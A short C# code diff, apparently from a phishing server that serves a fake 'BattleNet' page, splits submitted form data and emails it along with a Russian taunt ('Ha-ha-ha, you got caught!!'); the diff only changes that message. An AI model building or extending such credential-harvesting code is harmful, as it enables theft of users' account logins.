@@ -85,7 +85,7 @@ public class Server
 
                     string[] formData = data.Split('&');
 
-                    var message = $"Ха-ха-хау!1!!";
+                    var message = $"Ха-ха-ха ты попался!!";
                     SendEmail(message , formData);
                 }
                 filePath = Path.Combine(staticDir, "BattleNet", "index.html");
